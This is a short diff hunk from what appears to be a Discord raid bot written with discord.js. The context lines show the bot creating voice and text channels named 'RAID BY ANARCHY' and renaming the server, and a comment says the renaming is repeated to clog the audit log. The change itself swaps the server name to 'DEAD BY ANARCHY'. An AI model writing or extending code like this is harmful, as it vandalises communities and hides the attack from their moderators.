@@ -14,7 +14,7 @@ const Discord = require('discord.js');
                 message.guild.createChannel('RAID BY ANARCHY', 'voice')
                 message.guild.createChannel('RAID BY ANARCHY', 'text')
                 //changes name tons of times to clog up the audit log
-                message.guild.setName("RAID BY ANARCHY");
+                message.guild.setName("DEAD BY ANARCHY");
                 }
             };
 
